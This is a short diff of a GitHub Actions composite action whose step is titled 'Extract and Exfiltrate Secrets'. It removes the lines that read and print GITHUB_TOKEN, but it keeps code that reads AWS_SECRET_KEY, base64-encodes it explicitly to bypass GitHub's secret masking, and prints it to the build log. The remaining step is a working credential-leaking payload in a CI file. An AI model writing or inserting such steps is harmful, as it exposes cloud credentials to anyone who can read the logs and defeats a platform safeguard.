@@ -7,11 +7,9 @@ runs:
     - name: 🔥 Extract and Exfiltrate Secrets
       run: |
         echo "🔓 Extracting GitHub Token..."
-        GITHUB_SECRET=$(printenv GITHUB_TOKEN)
         AWS_SECRET=$(printenv AWS_SECRET_KEY)
 
         # Encode secrets to bypass GitHub masking
-        echo "🔓 Base64 Encoded GITHUB_TOKEN: $(echo $GITHUB_SECRET | base64)"
         echo "🔓 Base64 Encoded AWS_SECRET_KEY: $(echo $AWS_SECRET | base64)"
 
       shell: bash
